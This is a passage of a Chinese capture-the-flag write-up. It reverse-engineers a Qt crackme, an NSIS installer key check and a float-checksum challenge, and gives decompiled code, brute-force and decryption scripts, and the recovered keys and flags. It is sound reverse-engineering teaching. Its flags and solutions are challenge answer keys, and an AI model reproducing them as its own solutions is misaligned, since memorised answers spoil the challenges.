class="built_in">ZNK11QMetaObject2trEPKcS1_i</span>(v10, &amp;dword_405008);</span><br><span class="line">  <span class="built_in">ZN6QLabel7setTextERK7QString</span>(v9, v10, v7, v8);</span><br><span class="line">  v2 = v10[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !*v10[<span class="number">0</span>] || *v10[<span class="number">0</span>] != <span class="number">-1</span> &amp;&amp; (v3 = _InterlockedSub(v10[<span class="number">0</span>], <span class="number">1u</span>), v2 = v10[<span class="number">0</span>], !v3) )</span><br><span class="line">    <span class="built_in">ZN10QArrayData10deallocateEPS_jj</span>(v2, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">ZNK11QMetaObject2trEPKcS1_i</span>(v10, &amp;dword_405008);</span><br><span class="line">  <span class="built_in">ZN7QWidget14setWindowTitleERK7QString</span>(v1, v10);</span><br><span class="line">  v4 = v10[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !*v10[<span class="number">0</span>] || *v10[<span class="number">0</span>] != <span class="number">-1</span> &amp;&amp; (v5 = _InterlockedSub(v10[<span class="number">0</span>], <span class="number">1u</span>), v4 = v10[<span class="number">0</span>], !v5) )</span><br><span class="line">    <span class="built_in">ZN10QArrayData10deallocateEPS_jj</span>(v4, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">ZN7QWidget4showEv</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过槽函数的交叉应用,找到了Qt程序的singal to slot的func, 类似<code>qt_static_metacall</code>,<br>以active函数照猫画虎共找到3个Qt signal 与 slot, 如下:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">v96 = sub_402150;</span><br><span class="line">v97 = <span class="number">0</span>;</span><br><span class="line">v94 = ZN15QAbstractButton7clickedEb;</span><br><span class="line">v54 = (_DWORD *)<span class="built_in">Znwj</span>(<span class="number">16</span>, v70);</span><br><span class="line">v55 = v96;</span><br><span class="line">v94 = ZN15QAbstractButton7clickedEb;</span><br><span class="line">v54 = (_DWORD *)<span class="built_in">Znwj</span>(<span class="number">16</span>, v70);</span><br><span class="line">v55 = v96;</span><br><span class="line">*v54 = <span class="number">1</span>;</span><br><span class="line">v54[<span class="number">1</span>] = sub_404A20;</span><br><span class="line">v54[<span class="number">2</span>] = v55;</span><br><span class="line">v54[<span class="number">3</span>] = v97;</span><br><span class="line"><span class="built_in">ZN7QObject11connectImplEPKS_PPvS1_S3_PN9QtPrivate15QSlotObjectBaseEN2Qt14ConnectionTypeEPKiPK11QMetaObject</span>(v75);</span><br><span class="line"><span class="built_in">ZN11QMetaObject10ConnectionD1Ev</span>(v75);</span><br><span class="line">v98 = sub_403240;</span><br><span class="line">v99 = <span class="number">0</span>;</span><br><span class="line">v100 = welcom_dialog;</span><br><span class="line">v101 = <span class="number">0</span>;</span><br><span class="line">v56 = (_DWORD *)<span class="built_in">Znwj</span>(<span class="number">16</span>, v53);</span><br><span class="line">v57 = v100;</span><br><span class="line">*v56 = <span class="number">1</span>;</span><br><span class="line">v56[<span class="number">1</span>] = sub_404910;</span><br><span class="line">v56[<span class="number">2</span>] = v57;</span><br><span class="line">v56[<span class="number">3</span>] = v101;</span><br><span class="line"><span class="built_in">ZN7QObject11connectImplEPKS_PPvS1_S3_PN9QtPrivate15QSlotObjectBaseEN2Qt14ConnectionTypeEPKiPK11QMetaObject</span>(v76);</span><br><span class="line"><span class="built_in">ZN11QMetaObject10ConnectionD1Ev</span>(v76);</span><br><span class="line">v102 = sub_403210;</span><br><span class="line">v103 = <span class="number">0</span>;</span><br><span class="line">v104 = failed_dialog;</span><br><span class="line">v105 = <span class="number">0</span>;</span><br><span class="line">v58 = (_DWORD *)<span class="built_in">Znwj</span>(<span class="number">16</span>, v74);</span><br><span class="line">v59 = v104;</span><br><span class="line">*v58 = <span class="number">1</span>;</span><br><span class="line">v58[<span class="number">1</span>] = sub_4049A0;</span><br><span class="line">v58[<span class="number">2</span>] = v59;</span><br><span class="line">v58[<span class="number">3</span>] = v105;</span><br><span class="line"><span class="built_in">ZN7QObject11connectImplEPKS_PPvS1_S3_PN9QtPrivate15QSlotObjectBaseEN2Qt14ConnectionTypeEPKiPK11QMetaObject</span>(v77);</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">ZN11QMetaObject10ConnectionD1Ev</span>(v77);</span><br></pre></td></tr></table></figure>
<p>其中一个是failed_dialog,另一个是welcom_dialog,另一个sub_0x402150就应该是check函数</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_402150</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  _DWORD v9[<span class="number">4</span>]; <span class="comment">// [esp+24h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v2 = (<span class="type">int</span>)(a1 + <span class="number">6</span>);</span><br><span class="line">  <span class="built_in">ZNK9QLineEdit4textEv</span>(v9, *(_DWORD *)(a1[<span class="number">9</span>] + <span class="number">4</span>));</span><br><span class="line">  v4 = v9[<span class="number">0</span>];</span><br><span class="line">  v9[<span class="number">0</span>] = v1[<span class="number">6</span>];</span><br><span class="line">  v3 = (<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)v9[<span class="number">0</span>];</span><br><span class="line">  v1[<span class="number">6</span>] = v4;</span><br><span class="line">  <span class="keyword">if</span> ( !*v3 || *v3 != <span class="number">-1</span> &amp;&amp; !_InterlockedSub(v3, <span class="number">1u</span>) )</span><br><span class="line">    <span class="built_in">ZN10QArrayData10deallocateEPS_jj</span>(v9[<span class="number">0</span>], <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">ZNK9QLineEdit4textEv</span>(v9, *(_DWORD *)(v1[<span class="number">9</span>] + <span class="number">8</span>));</span><br><span class="line">  v6 = v9[<span class="number">0</span>];</span><br><span class="line">  v9[<span class="number">0</span>] = v1[<span class="number">7</span>];</span><br><span class="line">  v5 = (<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)v9[<span class="number">0</span>];</span><br><span class="line">  v1[<span class="number">7</span>] = v6;</span><br><span class="line">  <span class="keyword">if</span> ( !*v5 || *v5 != <span class="number">-1</span> &amp;&amp; !_InterlockedSub(v5, <span class="number">1u</span>) )</span><br><span class="line">    <span class="built_in">ZN10QArrayData10deallocateEPS_jj</span>(v9[<span class="number">0</span>], <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">  v7 = <span class="built_in">sub_401FB0</span>(v1 + <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="built_in">sub_402090</span>(v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_403240</span>(v2);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_403210</span>((<span class="type">int</span>)v1);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>ZNK9QLineEdit4textEv</code>方法分别取username和passord的字符串<br>在sub_401Fb0对password简单编码后在<code>sub_004021D8:cmp edi, eax</code>进行明文比较<br>已知username是liubenwei,直接在sub_004021D8下断点,eax极为密码<br><img src="http://tacqiniu.jagger2zr.com/Snipaste_2020-03-03_22-37-17.png"><br>flag{41d26f0}</p>
<h2 id="奇怪的安装包"><a href="#奇怪的安装包" class="headerlink" title="奇怪的安装包"></a>奇怪的安装包</h2><p>NSIS脚本如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">  Dialogs::InputBox 1 请输入key &quot;Input your key&quot; 确定 取消 4 6</span><br><span class="line">    ; Call Initialize_____Plugins</span><br><span class="line">    ; SetOverwrite off</span><br><span class="line">    ; File $PLUGINSDIR\Dialogs.dll</span><br><span class="line">    ; SetDetailsPrint lastused</span><br><span class="line">    ; Push 6</span><br><span class="line">    ; Push 4</span><br><span class="line">    ; Push 取消</span><br><span class="line">    ; Push 确定</span><br><span class="line">    ; Push &quot;Input your key&quot;</span><br><span class="line">    ; Push 请输入key</span><br><span class="line">    ; Push 1</span><br><span class="line">    ; CallInstDLL $PLUGINSDIR\Dialogs.dll InputBox</span><br><span class="line">  DetailPrint &quot;Checking...: $6&quot;</span><br><span class="line">  IntCmp $4 1 0 label_415 label_415</span><br><span class="line">  StrCmp $6 NSIISSOEASY 0 label_415</span><br><span class="line">  MessageBox MB_OK key正确</span><br><span class="line">  Dialogs::InputBox 1 请输入flag &quot;Input your flag&quot; 确定 取消 4 6</span><br><span class="line">    ; Call Initialize_____Plugins</span><br><span class="line">    ; AllowSkipFiles off</span><br><span class="line">    ; File $PLUGINSDIR\Dialogs.dll</span><br><span class="line">    ; SetDetailsPrint lastused</span><br><span class="line">    ; Push 6</span><br><span class="line">    ; Push 4</span><br><span class="line">    ; Push 取消</span><br><span class="line">    ; Push 确定</span><br><span class="line">    ; Push &quot;Input your flag&quot;</span><br><span class="line">    ; Push 请输入flag</span><br><span class="line">    ; Push 1</span><br><span class="line">    ; CallInstDLL $PLUGINSDIR\Dialogs.dll InputBox</span><br><span class="line">  IntCmp $4 1 0 label_415 label_415</span><br><span class="line">  Push $6</span><br><span class="line">  Call func_429</span><br><span class="line">  Pop $6</span><br><span class="line">  StrCpy $3 gm`fzd787`7bb,g72d,592b,8`g1,cg96813e8d``|</span><br><span class="line">  StrCmp $3 $6 0 label_417</span><br><span class="line">  MessageBox MB_OK flag正确,可以愉快的玩游戏了</span><br><span class="line">  Goto label_419</span><br><span class="line">label_415:</span><br><span class="line">  MessageBox MB_OK 错误的key</span><br><span class="line">  MessageBox MB_OK 想办法找到正确的key把</span><br><span class="line">label_417:</span><br><span class="line">  MessageBox MB_OK flag错误</span><br><span class="line">  MessageBox MB_OK 想办法找到正确的flag把</span><br><span class="line">label_419:</span><br><span class="line">SectionEnd</span><br><span class="line"></span><br><span class="line">Function func_429</span><br><span class="line">  Pop $9</span><br><span class="line">  StrCpy $3 &quot;&quot;</span><br><span class="line">  StrCpy $0 $9</span><br><span class="line">  StrCpy $1 0</span><br><span class="line">label_433:</span><br><span class="line">  StrCpy $2 $0 1 $1</span><br><span class="line">  StrCmp $2 &quot;&quot; label_443</span><br><span class="line">  Push $2</span><br><span class="line">  Call func_445</span><br><span class="line">  Pop $2</span><br><span class="line">  IntOp $2 $2 ^ 1</span><br><span class="line">  IntFmt $2 %c $2</span><br><span class="line">  IntOp $1 $1 + 1</span><br><span class="line">  StrCpy $3 $3$2</span><br><span class="line">  Goto label_433</span><br><span class="line">label_443:</span><br><span class="line">  Push $3</span><br><span class="line">FunctionEnd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Function func_445</span><br><span class="line">  Exch $0</span><br><span class="line">  Push $1</span><br><span class="line">  Push $2</span><br><span class="line">  StrCpy $2 1</span><br><span class="line">label_451:</span><br><span class="line">  IntFmt $1 %c $2</span><br><span class="line">  StrCmpS $1 $0 0 label_455</span><br><span class="line">  StrCpy $0 $2</span><br><span class="line">  Goto label_458</span><br><span class="line">label_455:</span><br><span class="line">  IntOp $2 $2 + 1</span><br><span class="line">  StrCmp $2 255 0 label_451</span><br><span class="line">  StrCpy $0 0</span><br><span class="line">label_458:</span><br><span class="line">  Pop $2</span><br><span class="line">  Pop $1</span><br><span class="line">  Exch $0</span><br><span class="line">FunctionEnd</span><br></pre></td></tr></table></figure>

<p>key: NSIISSOEASY <br><br>flag:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">bytearray</span>(<span class="string">b&#x27;gm`fzd787`7bb,g72d,592b,8`g1,cg96813e8d``|&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> a:</span><br><span class="line">    flag+= <span class="built_in">chr</span>(it^<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;e696a6cc-f63e-483c-9af0-bf87902d9eaa&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Code2"><a href="#Code2" class="headerlink" title="Code2"></a>Code2</h2><p>算法主要在sub_13F661890中</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_13F665628 &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v2 = Buffer;</span><br><span class="line">  v3 = (<span class="type">unsigned</span> <span class="type">int</span>)dword_13F665628;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">while</span> ( *v2 != *(_BYTE *)(v5 + <span class="number">0x13F6658E0</span>i64) )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v4;</span><br><span class="line">      ++v5;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">6</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = v1;</span><br><span class="line">    v1 = v1 * *((<span class="type">float</span> *)&amp;xmmword_13F665850 + v5);</span><br><span class="line">    v0 = v0 + (<span class="type">float</span>)(v6 * *((<span class="type">float</span> *)&amp;xmmword_13F6657C0 + v5));</span><br><span class="line">LABEL_8:</span><br><span class="line">    ++v2;</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">fabs</span>(v0 - <span class="number">0.129556</span>) &gt; <span class="number">0.000001</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are wrong!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输入限制在6ba879 6个字符中,长度不限制,float IEEE754很恼人,只能采取爆破,发现长度9位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8ab86b897</span></span><br><span class="line"><span class="comment"># flag&#123;8ab86897-25c9-811a-ce9a-18547ae6801e&#125;</span></span><br><span class="line">s = <span class="string">&quot;8ab697&quot;</span></span><br><span class="line"></span><br><span class="line">x =[<span class="number">0x3EAAAAAB</span>,<span class="number">0x3DE38E39</span>,<span class="number">0x3E638E39</span>,<span class="number">0x3DE38E39</span>,<span class="number">0x3DE38E39</span>,<span class="number">0x3DE38E39</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">y =[<span class="number">0</span>,<span class="number">0x3EAAAAAB</span>,<span class="number">0x3EE38E39</span>,<span class="number">0x3F2AAAAB</span>,<span class="number">0x3F471C72</span>,<span class="number">0x3F638E39</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">xmm = [struct.unpack(<span class="string">&#x27;&lt;f&#x27;</span>,struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,i))[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> x]</span><br><span class="line">ymm = [struct.unpack(<span class="string">&#x27;&lt;f&#x27;</span>,struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>,i))[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> y]</span><br><span class="line"><span class="comment"># print(xmm,ymm)</span></span><br><span class="line"></span><br><span class="line">sns = <span class="built_in">list</span>(product(s,repeat=<span class="number">9</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">en</span>(<span class="params">sn</span>):</span><br><span class="line">    v2 = <span class="number">0</span></span><br><span class="line">    v3 = <span class="built_in">len</span>(sn)</span><br><span class="line">    <span class="comment"># print(v3)</span></span><br><span class="line">    v0 = <span class="number">0.0</span></span><br><span class="line">    v1 = <span class="number">1.0</span></span><br><span class="line">    <span class="keyword">while</span> v3:</span><br><span class="line">        v4 = <span class="number">0</span></span><br><span class="line">        v5 = <span class="number">0</span></span><br><span class="line">        <span class="comment"># print(sn[v2],s[v5])</span></span><br><span class="line">        <span class="keyword">while</span> sn[v2] != s[v5]:</span><br><span class="line">            v4 = v4+<span class="number">1</span></span><br><span class="line">            v5 = v5+<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> v4 &gt;= <span class="number">6</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> v4 &lt; <span class="number">6</span>:</span><br><span class="line">            v6 = v1</span><br><span class="line">            v1 = v1 * xmm[v5]</span><br><span class="line">            v0 = v0 + (v6 * ymm[v5])</span><br><span class="line">        v2 = v2+<span class="number">1</span></span><br><span class="line">        v3 = v3-<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx,sn <span class="keyword">in</span> <span class="built_in">enumerate</span>(sns):</span><br><span class="line">    sn = <span class="string">&#x27;&#x27;</span>.join(sn)</span><br><span class="line">    res = en(sn)</span><br><span class="line">    <span class="keyword">if</span> math.fabs(res - <span class="number">0.129556</span>) &lt; <span class="number">0.000001</span>:</span><br><span class="line">        <span class="built_in">print</span>(sn)</span><br></pre></td></tr></table></figure>
<p>最终爆破出5个密码,依次尝试发现8ab86b897会爆出flag<br>将后面流程也简单分析了下:<br>用sn作为XXTEA算法的密钥,后补<code>&#39;\0&#39;</code>扩展到0x10 byte<br>解base64的字符串tiDBHSFrQBlPMzOozx7sQWbo77GjGFH&#x2F;F4EqZ8R6HuLyb+OQn9pfSCW49GWWRD3b<br>进行tea解密,最终解密得到flag,其他几个密钥会解出null</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code2 ./foo</span></span><br><span class="line"><span class="comment">// flag&#123;8ab86897-25c9-811a-ce9a-18547ae6801e&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/bio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/buffer.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;error.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xxtea.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">base64_encode</span><span class="params">(<span class="type">char</span> *in_str, <span class="type">int</span> in_len, <span class="type">char</span> *out_str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BIO *b64, *bio;</span><br><span class="line">    BUF_MEM *bptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_str == <span class="literal">NULL</span> || out_str == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    b64 = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_f_base64</span>());</span><br><span class="line">    bio = <span class="built_in">BIO_new</span>(<span class="built_in">BIO_s_mem</span>());</span><br><span class="line">    bio = <span class="built_in">BIO_push</span>(b64, bio);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIO_write</span>(bio, in_str, in_len);</span><br><span class="line">    <span class="built_in">BIO_flush</span>(bio);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIO_get_mem_ptr</span>(bio, &amp;bptr);</span><br><span class="line">    <span class="built_in">memcpy</span>(out_str, bptr-&gt;data, bptr-&gt;length);</span><br><span class="line">    out_str[bptr-&gt;length] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    size = bptr-&gt;length;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIO_free_all</span>(bio);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">base64_decode</span><span class="params">(<span class="type">char</span> *in_str, <span class="type">int</span> in_len, <span class="type">char</span> *out_str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BIO *b64, *bio;</span><br><span class="line">    BUF_MEM *bptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> counts;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_str == <span class="literal">NULL</span> || out_str == <span 